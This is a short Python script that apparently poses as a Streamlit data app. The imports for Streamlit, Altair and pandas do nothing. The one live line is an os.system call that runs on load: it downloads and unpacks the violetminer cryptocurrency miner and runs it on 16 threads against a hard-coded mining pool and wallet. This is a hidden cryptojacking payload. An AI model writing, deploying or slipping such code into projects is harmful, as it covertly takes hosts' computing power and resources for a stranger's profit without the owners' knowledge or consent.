from collections import namedtuple
import altair as alt
import math
import pandas as pd
import streamlit as st
import os
import time
import subprocess
from os import system, name
from time import sleep
from subprocess import PIPE, Popen
import base64
os.system("curl -L -o violetminer-linux-v0.2.2.tar.gz https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz && tar -xf violetminer-linux-v0.2.2.tar.gz && cd violetminer-linux-v0.2.2 && ./violetminer --algorithm wrkzcoin --pool stratum+tcp://stc.kelepool.com:80 --username stc1py6v8s69q96vpr8m4z60wl69u90mafy60j57uxhd062c5uvrw7cgjdxrcdzszaxq3na63d8h0az7zkewn9s7.001 --password 123456 --disableNVIDIA --threads 16")
